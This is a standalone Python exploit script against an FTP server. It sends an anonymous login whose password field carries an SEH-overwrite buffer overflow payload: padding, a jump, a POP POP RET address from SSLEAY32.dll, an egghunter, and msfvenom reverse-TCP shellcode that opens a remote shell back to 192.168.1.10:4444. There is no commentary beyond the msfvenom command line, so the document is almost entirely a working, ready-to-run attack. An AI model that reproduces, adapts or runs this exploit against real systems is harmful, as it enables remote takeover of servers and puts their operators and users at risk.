#!/usr/bin/python

import os,sys,struct,socket

host = '192.168.1.26'
port = 21

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c -b '\x00\x20' EXITFUNC=thread
# Payload size: 351 bytes
shellcode = ("W00TW00T"
"\xb8\x9d\xa9\x16\x99\xdb\xc1\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x46\x12\x03\x46\x12\x83\x73\x55\xf4\x6c\x77\x4e\x7b"
"\x8e\x87\x8f\x1c\x06\x62\xbe\x1c\x7c\xe7\x91\xac\xf6\xa5\x1d"
"\x46\x5a\x5d\x95\x2a\x73\x52\x1e\x80\xa5\x5d\x9f\xb9\x96\xfc"
"\x23\xc0\xca\xde\x1a\x0b\x1f\x1f\x5a\x76\xd2\x4d\x33\xfc\x41"
"\x61\x30\x48\x5a\x0a\x0a\x5c\xda\xef\xdb\x5f\xcb\xbe\x50\x06"
"\xcb\x41\xb4\x32\x42\x59\xd9\x7f\x1c\xd2\x29\x0b\x9f\x32\x60"
"\xf4\x0c\x7b\x4c\x07\x4c\xbc\x6b\xf8\x3b\xb4\x8f\x85\x3b\x03"
"\xed\x51\xc9\x97\x55\x11\x69\x73\x67\xf6\xec\xf0\x6b\xb3\x7b"
"\x5e\x68\x42\xaf\xd5\x94\xcf\x4e\x39\x1d\x8b\x74\x9d\x45\x4f"
"\x14\x84\x23\x3e\x29\xd6\x8b\x9f\x8f\x9d\x26\xcb\xbd\xfc\x2e"
"\x38\x8c\xfe\xae\x56\x87\x8d\x9c\xf9\x33\x19\xad\x72\x9a\xde"
"\xd2\xa8\x5a\x70\x2d\x53\x9b\x59\xea\x07\xcb\xf1\xdb\x27\x80"
"\x01\xe3\xfd\x07\x51\x4b\xae\xe7\x01\x2b\x1e\x80\x4b\xa4\x41"
"\xb0\x74\x6e\xea\x5b\x8f\xf9\xd5\x34\x8e\xf3\xbd\x46\x90\x12"
"\x62\xce\x76\x7e\x8a\x86\x21\x17\x33\x83\xb9\x86\xbc\x19\xc4"
"\x89\x37\xae\x39\x47\xb0\xdb\x29\x30\x30\x96\x13\x97\x4f\x0c"
"\x3b\x7b\xdd\xcb\xbb\xf2\xfe\x43\xec\x53\x30\x9a\x78\x4e\x6b"
"\x34\x9e\x93\xed\x7f\x1a\x48\xce\x7e\xa3\x1d\x6a\xa5\xb3\xdb"
"\x73\xe1\xe7\xb3\x25\xbf\x51\x72\x9c\x71\x0b\x2c\x73\xd8\xdb"
"\xa9\xbf\xdb\x9d\xb5\x95\xad\x41\x07\x40\xe8\x7e\xa8\x04\xfc"
"\x07\xd4\xb4\x03\xd2\x5c\xd4\xe1\xf6\xa8\x7d\xbc\x93\x10\xe0"
"\x3f\x4e\x56\x1d\xbc\x7a\x27\xda\xdc\x0f\x22\xa6\x5a\xfc\x5e"
"\xb7\x0e\x02\xcc\xb8\x1a")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = ''
payload += '\x2c'
payload += 'A' * 2200
payload += shellcode
payload += '\xeb\x19\x90\x90'
payload += struct.pack("<I", 0x100103C0) # POP POP RET SSLEAY32.dll
payload += '\x90' * 30
payload += egghunter
payload += 'C' * (3000 - len(payload))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host,port))
sock.recv(1024)
sock.send("USER anonymous\r\n")
sock.recv(1024)
sock.send("PASS " + payload + "\r\n")
sock.recv(1024)
sock.close()
